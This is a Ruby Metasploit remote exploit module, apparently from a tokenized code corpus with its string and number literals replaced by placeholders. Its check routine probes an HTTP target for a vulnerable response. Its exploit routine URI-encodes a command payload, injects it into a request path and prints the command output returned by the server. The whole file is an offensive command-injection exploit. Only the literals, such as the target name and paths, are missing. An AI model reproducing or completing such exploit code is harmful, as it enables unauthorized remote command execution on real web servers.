require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > false , <str> = > { <str> = > true , <str> = > <int> , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > [ [ <str> , { } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > { <str> = > <str> } } , <int> ) if ( res and res . body . match ( <str> ) ) return Exploit :: CheckCode :: Vulnerable end return Exploit :: CheckCode :: Safe end def exploit command = Rex :: Text . uri_encode ( payload . encoded ) urlconfigdir = normalize_uri ( datastore [ <str> ] ) + <str> command <str> res = send_request_raw ( { <str> = > urlconfigdir , <str> = > <str> , <str> = > { <str> = > <str> , } } , <int> ) if ( res ) print_status ( <str> res . code <str> res . message <str> ) m = res . body . match ( <str> ) if ( m ) print_status ( <str> ) print ( <str> + m [ <int> ] + <str> ) else print_status ( <str> ) end else print_status ( <str> ) end end end 
